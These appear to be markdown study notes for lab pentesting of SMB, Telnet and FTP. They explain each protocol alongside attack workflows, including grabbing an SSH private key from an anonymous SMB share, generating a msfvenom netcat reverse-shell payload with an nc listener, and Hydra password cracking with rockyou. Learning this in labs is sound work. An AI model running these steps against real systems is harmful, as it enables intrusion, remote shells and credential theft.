
# Network Protocols & Pentesting Notes

---

## SMB (Server Message Block)

**What is SMB?**

* Network protocol for sharing files, printers, and resources on local networks.
* Developed by Microsoft, supported on Windows, Linux, macOS.

**Key Features:**

* File and folder sharing
* Printer sharing
* Network browsing
* Authentication and access control

**Ports:**

* TCP 445 (modern SMB)
* TCP 139 (older NetBIOS over TCP/IP)

**Common Tools:**

* Windows File Explorer
* `smbclient` (Linux command-line client)
* `enum4linux` for enumeration
* `nmap` for port scanning

**Basic SMB Enumeration & Exploitation:**

```bash
# Scan all ports & services on target
nmap -p- -sV 10.10.37.246

# Enumerate SMB shares & info
enum4linux 10.10.37.246

# Connect to SMB share (replace IP/share/user/port)
smbclient //10.10.10.10/secrets -U Anonymous -p 445

# Download file after connecting
get id_rsa

# Secure the downloaded key
chmod 600 id_rsa

# SSH into target using key
ssh -i id_rsa user@10.10.10.10
```

---

## Telnet

**What is Telnet?**

* Network protocol & CLI tool to remotely connect to machines over TCP (usually port 23).
* Sends commands and receives output in plain text (not encrypted).

**Common Usage:**

* Connect to remote host:

  ```bash
  telnet <IP> <port>
  ```

* Check open ports (e.g., port 80):

  ```bash
  telnet example.com 80
  ```

* Exit session: `Ctrl + ]` then type `quit`

**Pentesting Workflow Example:**

```bash
# Scan for open ports
sudo nmap -p- -T4 -vv 10.10.228.173 -oN fullportscan.txt

# Aggressive scan on specific port to get version & usernames
sudo nmap -A -p 8012 -T4 -vv 10.10.228.173 -oN fullportscan.txt

# Telnet into open port
telnet <IP> <port>

# Capture network traffic (tcpdump example)
sudo tcpdump ip proto \\icmp -i tun0

# Ping to test connection and observe tcpdump
ping <IP> -c 1

# Generate reverse shell payload with msfvenom
msfvenom -p cmd/unix/reverse_netcat lhost=<localTunIP> lport=4444 R

# Listen on local port with netcat
nc -lvnp 4444

# Run payload on target via telnet to get shell
.RUN <payload>
```

---

## FTP (File Transfer Protocol)

**What is FTP?**

* Protocol to upload, download, rename, delete, move files between client & server.
* Uses port 21 (control) and port 20 (data in active mode).
* No encryption by default — data including credentials sent in plain text.

**Modes:**

* Active (server connects back to client for data)
* Passive (client initiates all connections; firewall friendly)

**Secure Alternatives:**

* SFTP (SSH-based)
* FTPS (SSL/TLS based)

**Basic Enumeration & Exploitation:**

```bash
# Scan for FTP service and version
nmap -A <IP>

# Connect anonymously if possible
ftp <IP>

# Download files to find info like usernames/passwords
get <filename>

# Use Hydra for password cracking (example for SSH, can adapt for FTP)
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<IP>

# Login to FTP with cracked credentials
ftp <IP>
# enter username and password
```

